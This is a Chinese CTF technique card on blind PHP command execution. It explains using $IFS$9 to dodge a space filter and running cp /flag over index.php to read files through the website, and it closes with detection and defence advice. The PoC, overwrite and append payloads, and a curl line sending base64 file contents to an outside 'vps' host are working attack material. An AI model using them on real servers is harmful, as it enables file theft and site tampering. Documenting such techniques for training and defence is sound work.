---
id: web-php-rce-blind-copy-target-over-existing-php-file
title: 无回显命令执行：把目标文件 cp 覆盖到一个已存在的 .php 路径上，再直接访问把它当纯文本读出来
type: scenario
domain: web
path: web/php/rce
technique: blind-rce-copy-file-over-php-path-read
aliases:
- 无回显 RCE 复制 flag
- cp /flag index.php
- 覆盖 PHP 文件读出内容
- 命令执行无回显怎么办
tags:
- php
- rce
- blind
- exfiltration
- cp
- ifs
- shell-exec
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:48:44+08:00'
  notes: 已对照原文核对；本次核对未读取图片；过滤正则 [{}[]()&<>\\\s\\\\]（原文 /[\\{\\}\\[\\]\\(\\)&<>\\\s\\\\\\\\]/）与 payload cmd=cp\\/flag\\.php、访问 index.php 取回 flag 的链路均与原文 TimeCage 第三步一致；PoC 未在真实目标执行；原文为 CTF 题，无受影响版本
---

## 一句话结论

命令执行没有回显、又不能弹 shell 时，最省事的取数方式不是外带而是“就地覆盖”：把目标文件用 `cp` 复制到一个**已存在、且 Web 可直接访问的 `.php` 文件**上（如 `cp$IFS$9/flag$IFS$9index.php`）。目标内容不含 `<?php` 标签，PHP 解析器会把它当纯文本原样输出，于是访问该 URL 就直接看到 flag——不需要写新文件、不需要知道 Web 根路径、也不依赖任何回显通道。

## 原理

- **无回显不等于不可取数**：`shell_exec`/`exec` 的返回值被丢弃，但命令的**副作用**（文件系统变化）仍然生效，而 Web 服务会把文件系统状态映射回 HTTP 响应。
- **覆盖已存在的 PHP 文件解决两个难题**：
  1. 不知道 Web 根目录：`index.php` 等入口文件相对路径好猜（当前工作目录通常就是站点根），用相对名即可；
  2. 写新文件可能被目录权限/后缀白名单/静态目录禁止执行策略拦住，而覆盖已有文件只需对该文件有写权限。
- **纯文本被 PHP 原样输出**：flag 内容通常是 `SYN{...}` 之类，不含 `<?php`，PHP 解析器找不到开标签就把整个文件当 inline HTML 输出，所以浏览器/curl 直接看到明文；即便内容里恰好有 `<`，也只是被当 HTML 渲染。
- **空格过滤用 `$IFS$9`**：`$IFS` 是 shell 的内部字段分隔符（默认空格/Tab/换行），`$9` 是空的位置参数，拼起来等价于一个空格，且字节序列里没有 `0x20`，可绕过“过滤空格”的黑名单。
- **为什么不用写马**：写 WebShell 还需要后续请求带命令、可能被 `disable_functions` 拦；覆盖读文件是一次性动作，成功率高、痕迹小（改的是业务文件，容易被当成“页面损坏”而非入侵）。

## 触发条件

- 存在命令执行（`shell_exec`/`exec`/`system`/反引号/`popen` 等），但输出不回显、或回显被丢弃。
- 命令过滤只挡部分字符（如 `{}[]()&<>\`\s\\`），未挡 `$`、`;`、`/`、`*`、`.`，也未禁 `cp`。
- 进程对站点入口文件（`index.php`）有写权限，或知道任意可写且可访问的 `.php`/`.html` 路径。
- 目标文件路径可猜（`/flag`、`/f*`、`../flag`）或可通过通配符命中。

## 利用步骤

1. 确认命令执行无回显：提交 `sleep 3` 观察响应延迟，或 `id` 观察无输出但请求成功。
2. 探测过滤字符：先试 `cat$IFS$9/flag`（无回显属正常），确认 `$`、`$IFS`、`/`、`;` 未被拦。
3. 覆盖入口文件：`cp$IFS$9/flag$IFS$9index.php`（相对路径，工作目录即站点根）；路径不确定时用通配符 `cp$IFS$9/f*$IFS$9index.php`。
4. 直接访问站点首页（`GET /`），响应体即 flag 内容（页面样式丢失是正常现象）。
5. 取到后如需要可再 `cp` 回去恢复（多数 CTF 场景不必），或改覆盖到 `404.html`、`robots.txt` 之类不破坏入口的文件。

## PoC

```text
# 服务端代码形态（无回显）
if (preg_match('/[\{\}\[\]\(\)&<>`\s\\\\]/', $cmd)) { die('Invalid Input!'); }
shell_exec($cmd);

# 1) 覆盖入口文件（$IFS$9 等价于一个空格）
cmd=cp$IFS$9/flag$IFS$9index.php

# 2) 读取
GET / HTTP/1.1
-> 响应体直接是 flag 文本
```

```bash
# 手工验证等价命令（本地示意）
cp /flag ./index.php && curl -s http://target/
```

说明：PoC 按原文题目的过滤正则与 payload 还原，命令未在真实目标执行；`index.php` 为相对路径，若工作目录不是站点根需换成绝对路径或先 `pwd` 探路。

## 变体与关联

- **覆盖目标变体**：`404.html`、`robots.txt`、`README.md`、`favicon.ico`（静态文件直接下载）、图片名（`cp /flag /var/www/html/x.png` 后访问，浏览器可能乱码但 curl 可取）。
- **追加而非覆盖**：`cat$IFS$9/flag>>index.php`（保留原页面、把内容追到末尾；若原文件以 `?>` 结尾则更稳）。
- **外带变体**：`curl$IFS$9http://vps/?d=$(cat$IFS$9/flag|base64)`、DNS 外带、`/dev/tcp` 反弹；无出网时才用本卡。
- **关联**：`web-php-rce-ifs-space-bypass-command-injection`（`$IFS$9`/`${IFS}` 等无空格命令构造）、`web-php-blind-rce-time-oracle-ifs-base64-char-bruteforce`（连写文件都禁时的时序 oracle）、`web-php-rce-regex-whitelist-glob-tmp-upload-exec`（字符白名单下用通配符打临时文件）。
- **边界**：Web 目录只读、入口文件属主不同、`cp` 被禁、`open_basedir` 限制跨目录、PHP-FPM 有 `security.limit_extensions` 且覆盖后仍按 PHP 解析（此时因无 `<?php` 仍是纯文本，通常不影响）时需换路径。

## 检测与防御

- **权限**：Web 进程对站点文件只读，代码目录与运行目录分离；上传/临时目录独立且禁止脚本解析。
- **命令执行面**：`disable_functions` 覆盖 `cp`/`mv`/`dd`/`tee`/`ln` 等文件族与执行族；容器内使用只读根文件系统（`--read-only` + tmpfs）。
- **WAF**：除关键字外检测 `$IFS`、`${IFS}`、`$9`、`>>`、`cp` 与路径通配符组合；对“请求 `index.php` 后首页内容不再是 HTML”的异常做完整性监控。
- **检测**：站点入口文件 mtime 突变、内容不含 `<?php`；同一时间窗内出现 `cp`/`cat` 子进程（EDR/auditd）；首页响应长度骤降或返回非 HTML 内容。
